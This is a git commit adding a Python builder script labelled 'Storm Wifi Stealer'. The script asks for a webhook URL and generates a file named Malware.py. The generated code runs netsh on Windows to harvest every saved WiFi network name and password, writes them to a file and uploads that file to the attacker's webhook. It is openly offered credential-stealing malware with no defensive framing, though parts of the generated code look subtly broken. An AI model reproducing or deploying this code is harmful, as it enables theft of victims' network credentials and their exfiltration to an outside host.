5afdb76705fa9785ee41c1c6bd736240c8e507b2
Storm⛈️ <hasanfireneno22@gmail.com>
2024-09-29 12:50:30 +0300

    Add files via upload

---
+++ builder.py
@@ -0,0 +1,67 @@
+def main():
+    while True:
+        try:
+            print("Storm Wifi Stealer\n")
+            webhook_url = input("webhook: ")
+            webhook_url = str(webhook_url)
+            with open("Malware.py", "w") as f:
+                f.write("""
+import platform
+import subprocess
+import requests
+import re
+
+# Global webhook URL
+webhook_url = """+webhook_url+"""
+
+# Software checking function
+def check_os():
+    return platform.system()
+
+# WiFi scraping function
+def W1F1():
+    try:
+        profiles_result = subprocess.run(["netsh", "wlan", "show", "profile"], capture_output=True, text=True, check=True)
+        profiles = re.findall(r"All User Profile\\s+:\\s+(.*)", profiles_result.stdout)
+        
+        wifi_info = []
+
+        for profile in profiles:
+            profile_name = profile.strip()
+            profile_details_result = subprocess.run(["netsh", "wlan", "show", "profile", profile_name], capture_output=True, text=True, check=True)
+            password_search = re.search(r"Key Content\\s+:\\s+(.*)", profile_details_result.stdout)
+            password = password_search.group(1).strip() if password_search else "No password found"
+            
+            wifi_info.append(f"SSID: {profile_name}, Password: {password}")
+
+        with open("output.txt", "w") as f:
+            for info in wifi_info:
+                f.write(info + "\\n")
+
+        with open("output.txt", 'rb') as file:
+            payload = {{'content': 'User network info!'}}
+            files = {{'file': file}}
+            response = requests.post(webhook_url, data=payload, files=files)
+            
+        if response.status_code == 204:
+            pass  
+        else:
+            pass 
+
+    except subprocess.CalledProcessError:
+        pass  
+
+def start():
+    if check_os() == 'Windows':
+        W1F1()
+    else:
+        payload = {{'content': 'OS not supported'}}
+        requests.post(webhook_url, data=payload)
+
+start()
+""")
+        except Exception as error:
+            print(f"An error occurred: {error}")
+
+if __name__ == "__main__":
+    main()
